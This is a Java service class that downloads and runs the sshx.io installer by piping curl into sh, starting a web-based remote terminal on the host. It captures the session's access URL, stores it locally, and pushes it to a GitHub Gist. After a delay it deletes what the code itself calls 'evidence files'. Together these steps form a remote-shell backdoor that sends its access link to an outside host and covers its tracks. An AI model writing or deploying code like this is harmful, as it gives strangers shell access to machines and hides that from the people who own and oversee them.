package com.github.vevc.service.impl;

import com.github.vevc.config.AppConfig;
import com.github.vevc.service.AbstractAppService;
import com.github.vevc.util.LogUtil;

import java.io.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class SshxServiceImpl extends AbstractAppService {

    private static final String INFO_FILE = "s.txt";
    private static final int CLEANUP_DELAY_SECONDS = 300;
    private static final Pattern URL_PATTERN = Pattern.compile("https://sshx\\.io/s/[a-zA-Z0-9]+#[a-zA-Z0-9]+");
    
    private GistSyncService gistSync;
    private String gistSshxFile = "sshx_PPMC.txt";
    private volatile String capturedUrl;

    public String getSshxUrl() {
        return capturedUrl;
    }

    public void setGistSync(GistSyncService gistSync) {
        this.gistSync = gistSync;
    }

    public void setGistSshxFile(String gistSshxFile) {
        this.gistSshxFile = gistSshxFile;
    }

    @Override
    protected String getAppDownloadUrl(String appVersion) {
        return null;
    }

    @Override
    public void install(AppConfig appConfig) throws Exception {
        LogUtil.info("SSHX will be installed via sshx.io script");
    }

    @Override
    public void startup() {
        File workDir = this.getWorkDir();
        File infoFile = new File(workDir, INFO_FILE);

        try {
            if (!workDir.exists()) {
                workDir.mkdirs();
            }

            // Delete old s.txt to generate new URL
            Files.deleteIfExists(infoFile.toPath());

            ProcessBuilder pb = new ProcessBuilder(
                    "/bin/bash", "-c",
                    "curl -sSf https://sshx.io/get | sh -s run"
            );
            pb.directory(workDir);
            pb.redirectErrorStream(true);

            LogUtil.info("Starting SSHX via sshx.io script...");
            this.currentProcess = pb.start();

            new Thread(() -> {
                try (BufferedReader reader = new BufferedReader(new InputStreamReader(currentProcess.getInputStream()))) {
                    String line;
                    boolean urlSynced = false;
                    while ((line = reader.readLine()) != null) {
                        LogUtil.info("[SSHX] " + line);
                        
                        if (!urlSynced) {
                            String sshxUrl = extractUrl(line);
                            if (sshxUrl != null) {
                                LogUtil.info("SSHX URL detected: " + sshxUrl);
                                capturedUrl = sshxUrl;
                                
                                if (gistSync != null && gistSync.isEnabled()) {
                                    gistSync.sync(gistSshxFile, sshxUrl);
                                }
                                
                                try {
                                    Files.writeString(infoFile.toPath(), sshxUrl);
                                } catch (IOException ignored) {}
                                
                                urlSynced = true;
                            }
                        }
                    }
                } catch (IOException e) {
                    LogUtil.info("[SSHX] Stream closed: " + e.getMessage());
                }
            }).start();

        } catch (Exception e) {
            LogUtil.error("SSHX startup failed", e);
        }
    }

    private String extractUrl(String output) {
        Matcher matcher = URL_PATTERN.matcher(output);
        if (matcher.find()) {
            return matcher.group();
        }
        return null;
    }

    @Override
    public void clean() {
        File workDir = this.getWorkDir();
        File infoFile = new File(workDir, INFO_FILE);

        try {
            TimeUnit.SECONDS.sleep(CLEANUP_DELAY_SECONDS);
            Files.deleteIfExists(infoFile.toPath());
            LogUtil.info("SSHX evidence files cleaned after 10 minutes");
        } catch (Exception e) {
            LogUtil.error("SSHX cleanup failed", e);
        }
    }
}
